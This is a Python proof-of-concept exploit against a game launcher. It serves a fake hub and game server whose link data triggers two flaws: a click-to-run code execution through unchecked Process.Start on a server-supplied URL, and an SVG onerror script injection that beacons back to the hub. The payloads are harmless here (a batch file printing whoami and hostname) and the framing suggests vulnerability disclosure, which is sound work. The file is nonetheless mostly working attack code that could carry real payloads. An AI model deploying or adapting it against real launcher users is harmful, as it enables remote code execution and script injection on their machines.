"""
PoC: Starlight.Launcher executes arbitrary programs from a server-supplied link URL.

Bridge.OpenBrowser() does Process.Start(FileName = url, UseShellExecute = true) with no
scheme check. url is ServerInfo.Links[].Url, which the launcher pulls from the hub, so
whoever runs a listed server chooses the string the OS shell is handed.

Path: hub /api/servers/info -> ServerItem.razor:107 -> ServerItem.razor.cs:102 -> Bridge.cs:47

Serves a fake hub and a fake game server.
"""

import json
import os
import sys
import threading
from datetime import datetime, timedelta, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs

HOST = "127.0.0.1"
SERVER_NAME = "[PoC] SL Launcher Vulns"
DESC = "Expand and click the links."


def write_bat():
    path = os.path.join(os.environ.get("TEMP", "."), "starlight_poc.bat")
    with open(path, "w", newline="") as fh:
        fh.write("@echo off\r\nwhoami\r\nhostname\r\npause\r\n")
    return path


def build_links(url, beacon):
    return [
        {
            "name": "Remote Code Execution",
            "icon": "web",
            "url": url,
        },
        {
            # MudIcon renders an Icon value starting with '<' as raw SVG markup.
            # The beacon must be absolute: a relative URL resolves against the
            # launcher's own origin and never reaches us.
            "name": "xss",
            "icon": f"<image href=x onerror=\"new Image().src='{beacon}?from=icon'\"/>",
            "url": "https://example.com/",
        },
    ]


def status_json():
    return {
        "name": SERVER_NAME,
        "players": 67,
        "soft_max_players": 420,
        "round_start_time": (datetime.now(timezone.utc) - timedelta(minutes=17))
            .isoformat().replace("+00:00", "Z"),
        "run_level": 1,
        "tags": ["region:eu_w", "lang:en"],
    }


def info_json(links):
    return {"desc": DESC, "links": links, "auth": {"mode": "Disabled", "public_key": ""}}


class Server(ThreadingHTTPServer):
    daemon_threads = True
    allow_reuse_address = False


def make_handler(address, links):
    class Handler(BaseHTTPRequestHandler):
        def reply(self, obj, code=200):
            body = json.dumps(obj).encode()
            self.send_response(code)
            # ReadFromJsonAsync rejects a non-JSON content type.
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_GET(self):
            path = urlparse(self.path).path.rstrip("/")
            if path == "/api/servers":
                self.reply([{"address": address, "statusData": status_json()}])
            elif path == "/api/servers/info":
                print("  launcher fetched info, links served")
                self.reply(info_json(links))
            elif path == "/status":
                self.reply(status_json())
            elif path == "/info":
                self.reply(info_json(links))
            elif path == "/beacon":
                src = parse_qs(urlparse(self.path).query).get("from", ["?"])[0]
                print(f"  XSS: script executed in the launcher UI (from={src})")
                self.reply({"ok": True})
            else:
                self.reply({"error": "not found"}, 404)

        def log_message(self, *_):
            pass

    return Handler


def main():
    if sys.platform != "win32":
        sys.exit("poc is win only but this should work everywhere")

    hub_port=8080
    game_port=1212

    sys.stdout.reconfigure(line_buffering=True)

    hub = f"http://{HOST}:{hub_port}/"
    address = f"ss14://{HOST}:{game_port}"
    payload = write_bat()
    links = build_links(payload, f"{hub}beacon")

    handler = make_handler(address, links)
    servers = []
    try:
        for port in (hub_port, game_port):
            httpd = Server((HOST, port), handler)
            servers.append(httpd)
            threading.Thread(target=httpd.serve_forever, daemon=True).start()
    except OSError as exc:
        for httpd in servers:
            httpd.server_close()
        sys.exit(f"cannot bind {port}: {exc}\nan earlier run is probably still alive")

    print(f"hub      {hub}")
    print(f"server   {address}")
    print(f"payload  {payload}")
    print(f"\nadd the hub to your launcher")
    print(f"\nXSS will execute on load, RCE will execute when you click the link")

    stop = threading.Event()
    try:
        while not stop.wait(0.5):
            pass
    except KeyboardInterrupt:
        pass
    finally:
        for httpd in servers:
            httpd.shutdown()
            httpd.server_close()


if __name__ == "__main__":
    main()
